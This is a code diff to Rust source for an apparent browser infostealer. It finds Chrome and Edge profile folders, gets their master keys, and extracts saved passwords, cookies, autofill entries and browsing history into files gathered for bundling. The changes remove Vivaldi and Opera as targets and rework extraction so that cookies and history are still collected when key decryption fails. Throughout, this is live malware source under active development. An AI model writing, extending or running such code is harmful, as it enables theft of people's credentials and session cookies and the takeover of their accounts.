@@ -18,7 +18,6 @@ struct MasterKeys {
 
 fn get_browsers() -> Vec<BrowserInfo> {
     let local = env::var("LOCALAPPDATA").unwrap_or_default();
-    let roaming = env::var("APPDATA").unwrap_or_default();
     vec![
         BrowserInfo {
             name: "Chrome",
@@ -34,21 +33,6 @@ fn get_browsers() -> Vec<BrowserInfo> {
             name: "Edge",
             user_data: PathBuf::from(&local).join("Microsoft").join("Edge").join("User Data"),
             has_profiles: true,
-        },
-        BrowserInfo {
-            name: "Vivaldi",
-            user_data: PathBuf::from(&local).join("Vivaldi").join("User Data"),
-            has_profiles: true,
-        },
-        BrowserInfo {
-            name: "Opera",
-            user_data: PathBuf::from(&roaming).join("Opera Software").join("Opera Stable"),
-            has_profiles: false,
-        },
-        BrowserInfo {
-            name: "OperaGX",
-            user_data: PathBuf::from(&roaming).join("Opera Software").join("Opera GX Stable"),
-            has_profiles: false,
         },
     ]
 }
@@ -309,7 +293,7 @@ fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
     drop(conn);
     cleanup_db(&temp);
     if count == 0 {
-        None
+        Some(super::netscape::empty_file())
     } else {
         super::netscape::build_file(&body)
     }
@@ -443,26 +427,30 @@ fn extract_history(profile_path: &Path) -> Option<String> {
 pub fn extract_all() -> Vec<(String, String)> {
     let mut results = Vec::new();
     for browser in get_browsers() {
-        if !browser.user_data.exists() { continue; }
-        let keys = match get_master_keys(&browser.user_data, browser.name) {
-            Some(k) => k,
-            None => continue,
-        };
+        if !browser.user_data.exists() {
+            continue;
+        }
+        let keys = get_master_keys(&browser.user_data, browser.name);
         let profiles = get_profiles(&browser.user_data, browser.has_profiles);
         for (profile_name, profile_path) in profiles {
-            let folder = format!("{}/{}", browser.name, profile_name);
-            if let Some(data) = extract_passwords(&profile_path, &keys) {
-                results.push((format!("{}/passwords.txt", folder), data));
-            }
-            if let Some(data) = extract_cookies(&profile_path, &keys) {
-                results.push((format!("{}/cookies.txt", folder), data));
-            }
-            if let Some(data) = extract_autofill(&profile_path) {
-                results.push((format!("{}/autofill.txt", folder), data));
-            }
-            if let Some(data) = extract_history(&profile_path) {
-                results.push((format!("{}/history.txt", folder), data));
-            }
+            let passwords = keys
+                .as_ref()
+                .and_then(|k| extract_passwords(&profile_path, k));
+            let cookies = keys
+                .as_ref()
+                .and_then(|k| extract_cookies(&profile_path, k));
+            let autofill = extract_autofill(&profile_path);
+            let history = extract_history(&profile_path);
+
+            super::zip_layout::push_profile_bundle(
+                &mut results,
+                browser.name,
+                &profile_name,
+                passwords,
+                cookies,
+                autofill,
+                history,
+            );
         }
     }
     results
